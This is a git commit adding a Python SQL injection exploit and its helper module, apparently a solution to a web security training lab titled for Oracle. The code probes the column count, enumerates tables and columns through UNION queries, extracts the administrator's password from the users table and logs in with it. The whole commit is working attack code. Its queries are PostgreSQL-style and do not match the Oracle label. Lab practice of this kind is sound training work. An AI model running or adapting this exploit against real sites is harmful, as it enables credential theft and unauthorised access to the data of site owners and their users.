1273dfc62cbdd83ea771c1083eecd1011331920e
madi <madimirzakup@gmail.com>
2025-01-15 17:43:01 +0500

    #

---
+++ Server Side Topics/SQLi/SQL injection attack, listing the database contents on Oracle/payload.py
@@ -0,0 +1,75 @@
+import sys
+import logging
+import urllib3
+import re
+
+import requests
+
+import utils
+from shop import Shop
+
+
+log = logging.getLogger(__name__)
+logging.basicConfig(
+    stream=sys.stdout,
+    level=logging.INFO,
+    format="{asctime} [{threadName}] [{levelname}] [{name}] {message}",
+    style="{",
+    datefmt="%H:%M:%S",
+)
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def main(args):
+    sess = requests.Session()
+    shop = Shop(args.url, args.no_proxy, sess)
+    num_columns = utils.determine_number_of_columns(shop.category_url, shop.no_proxy)
+    if not num_columns:
+        log.error("Could not determine number of columns. Exiting")
+        sys.exit(-1)
+    text_columns = utils.determine_text_columns(
+        shop.category_url, shop.no_proxy, num_columns
+    )
+    log.info("Getting users table")
+    nulls = ["NULL"] * num_columns
+    nulls[text_columns[0]] = "table_name"
+    nulls = ",".join(nulls)
+    resp = shop.get_category(
+        f"' UNION SELECT {nulls} from information_schema.tables where table_schema = 'public'-- "
+    )
+    pattern = re.compile(r"<th>(users_.*?)</th>")
+    m = pattern.search(resp.text)
+    users_table = m[1]
+    log.info(f"Found users table: {users_table}")
+    log.info("Getting columns from table.")
+    nulls = ["NULL"] * num_columns
+    nulls[text_columns[0]] = "column_name"
+    nulls = ",".join(nulls)
+    resp = shop.get_category(
+        f"' UNION SELECT {nulls} from information_schema.columns where table_name = '{users_table}'-- "
+    )
+    #passwords
+    pattern = re.compile(r"<th>(password_.*?)</th>")
+    m = pattern.search(resp.text)
+    password_column = m[1]
+    #username
+    pattern = re.compile(r"<th>(username_.*?)</th>")
+    m = pattern.search(resp.text)
+    username_column = m[1]
+    log.info(f"Got username and pw columns: {username_column}, {password_column}")
+    log.info("Getting usernames and pw from db")
+    nulls = ["NULL"] * num_columns
+    nulls[text_columns[0]] = username_column
+    nulls[text_columns[1]] = password_column
+    nulls = ",".join(nulls)
+    resp = shop.get_category(f"' UNION SELECT {nulls} from {users_table}-- ")
+    pattern = r"<th>administrator</th>.*?<td>(.*?)</td>"
+    m = re.search(pattern, resp.text, flags=re.M | re.DOTALL)
+    password = m[1]
+    log.info(f"Got admin's pw: {password}")
+    shop.login("administrator", password)
+    shop.is_solved()
+    
+    
+if __name__ == "__main__":
+    args=utils.parse_args(sys.argv)
+    main(args)
---
+++ Server Side Topics/SQLi/SQL injection attack, listing the database contents on Oracle/utils.py
@@ -0,0 +1,83 @@
+import sys
+import argparse
+import re
+import logging
+import urllib3
+import requests
+
+
+PROXIES = {
+    "http": "127.0.0.1:8080",
+    "https": "127.0.0.1:8080",
+}
+
+
+log = logging.getLogger(__name__)
+logging.basicConfig(
+    stream=sys.stdout,
+    level=logging.INFO,
+    format="{asctime} [{threadName}] [{levelname}] [{name}] {message}",
+    style="{", 
+    datefmt="%H:%M:%S",
+)
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def parse_args(args: list):
+    parser = argparse.ArgumentParser()
+    parser.add_argument(
+        "-n", "--no-proxy", default=False, action="store_true", help="do not use proxy"
+    )
+    parser.add_argument("url", help="url of lab")
+    return parser.parse_args() 
+
+def normalize_url(url):
+    if not url.endswith("/"):
+        url = url + "/"
+    return url
+
+def determine_number_of_columns(url, no_proxy, oracle=False):
+    log.info("Determining number of columns")
+    nulls_list=["NULL"]
+    num_columns = None
+    while len(nulls_list) < 20:
+        nulls = ",".join(nulls_list)
+        if oracle:
+            category = f"' UNION SELECT {nulls} FROM dual-- "
+        else:
+            category = f"' UNION SELECT {nulls}-- "
+        exploit_url = url + category
+        if no_proxy: 
+            resp = requests.get(exploit_url)
+        else: 
+            resp = requests.get(exploit_url, proxies=PROXIES, verify=False)
+        if resp.status_code == 200:
+            num_columns = len(nulls_list)
+            break
+        nulls_list.append("NULL")
+    if num_columns:
+        log.info(f"number of columns if: {num_columns}")
+    return num_columns
+
+
+def determine_text_columns(url, no_proxy, num_columns, oracle=False):
+    text_columns = []
+    for i in range(0, num_columns):
+        nulls_list = ["NULL"] * num_columns
+        nulls_list[i] = "'a'"
+        nulls = ",".join(nulls_list)
+        if oracle:
+            category = f"' UNION SELECT {nulls} FROM dual-- "
+        else:
+            category = f"' UNION SELECT {nulls}-- "
+        exploit_url = url + category
+        if no_proxy: 
+            resp = requests.get(exploit_url)
+        else: 
+            resp = requests.get(exploit_url, proxies=PROXIES, verify=False)
+        if resp.status_code == 200:
+            text_columns.append(i)
+    if text_columns:
+        text_columns_str = ", ".join(map(str, text_columns))
+        log.info(f"The text columns are: {text_columns_str}")
+    return text_columns
